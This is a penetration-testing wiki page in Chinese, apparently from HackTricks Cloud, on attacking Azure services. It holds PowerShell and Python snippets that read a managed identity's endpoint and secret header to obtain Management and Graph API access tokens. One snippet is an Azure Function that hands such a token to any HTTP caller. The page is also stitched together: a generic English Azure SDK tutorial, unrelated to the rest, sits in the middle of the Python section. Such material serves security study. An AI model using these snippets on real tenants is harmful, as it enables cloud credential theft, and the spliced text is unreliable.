# Az - 服务

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 门户

您可以在 [**https://msportals.io/**](https://msportals.io/) 上找到**Microsoft 门户的列表**

### 原始请求

#### 通过 Powershell 访问 Azure API

从 **IDENTITY\_HEADER** 和 **IDENTITY\_ENDPOINT** 获取 **access\_token**：`system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');`.

然后查询 Azure REST API 来获取 **subscription ID** 和更多信息。
```powershell
$Token = 'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
# $URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# List resources and check for runCommand privileges
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/<RG-NAME>/providers/Microsoft.Compute/virtualMachines/<RESOURCE/providers/Microsoft.Authorization/permissions?apiversion=2015-07-01'
```
#### 通过Python版本访问Azure API

To interact with Azure services using Python, you can make use of the Azure SDK for Python. This SDK provides a set of libraries and tools that allow you to easily access and manage various Azure services.

### Prerequisites

Before you can start using the Azure SDK for Python, you need to have the following:

- Python installed on your system
- An Azure subscription
- Azure SDK for Python installed

### Installing the Azure SDK for Python

To install the Azure SDK for Python, you can use the pip package manager. Open a terminal or command prompt and run the following command:

```shell
pip install azure
```

### Authenticating with Azure

To authenticate with Azure, you need to obtain a set of credentials. There are different ways to authenticate, such as using a service principal or a managed identity. Once you have the credentials, you can use them to create an instance of the Azure client.

Here is an example of authenticating with Azure using a service principal:

```python
from azure.identity import ClientSecretCredential
from azure.mgmt.resource import ResourceManagementClient

# Set the credentials
tenant_id = '<your-tenant-id>'
client_id = '<your-client-id>'
client_secret = '<your-client-secret>'

# Create the credentials object
credentials = ClientSecretCredential(tenant_id, client_id, client_secret)

# Create the Azure client
client = ResourceManagementClient(credentials, '<your-subscription-id>')
```

### Accessing Azure Services

Once you have authenticated with Azure, you can use the Azure client to access and manage various Azure services. The Azure SDK for Python provides a set of modules for different services, such as compute, storage, networking, and more.

Here is an example of accessing the Azure Virtual Machines service:

```python
from azure.mgmt.compute import ComputeManagementClient

# Create the compute client
compute_client = ComputeManagementClient(credentials, '<your-subscription-id>')

# List all virtual machines
virtual_machines = compute_client.virtual_machines.list_all()

# Print the virtual machine names
for vm in virtual_machines:
    print(vm.name)
```

### Conclusion

In this guide, we have seen how to access Azure services using Python. The Azure SDK for Python provides a convenient way to interact with Azure and manage various services. By following the steps outlined in this guide, you can start building applications and automating tasks using Python and Azure.
```python
IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

print("[+] Management API")
cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID/AccountID: "+json.loads(val)["client_id"])

print("\r\n[+] Graph API")
cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
print(json.loads(val)["access_token"])
print("ClientID/AccountID: "+json.loads(val)["client_id"])
```
或者在一个Python函数内部：
```python
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
logging.info('Python HTTP trigger function processed a request.')
IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
return func.HttpResponse(val, status_code=200)
```
## 服务列表

* [**Azure AD**](az-azuread.md)
* [**应用程序代理**](az-application-proxy.md)
* [**Arm模板/部署**](az-arm-templates.md)
* [**自动化帐户**](az-automation-account/)
* [**应用服务和函数应用**](az-azure-app-service.md)
* [**Blob存储**](az-blob-storage.md)
* [**Intune**](../intune.md)
* [**Keyvault**](../keyvault.md)
* [**虚拟机**](../vms.md)

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的动态 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
